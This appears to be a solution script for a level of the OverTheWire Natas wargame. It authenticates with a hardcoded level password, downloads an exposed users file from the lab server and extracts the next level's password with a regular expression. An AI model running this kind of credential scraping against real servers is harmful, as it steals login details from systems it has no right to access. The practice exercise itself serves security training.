#!/usr/bin/python3

import requests
import re

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = 'http://%s.natas.labs.overthewire.org' % username

response = requests.get(url+'/files/users.txt', auth = (username, password))
content = response.text
# print(content)


pwd = re.findall('natas3:(.*)', content)[0]
print(pwd)

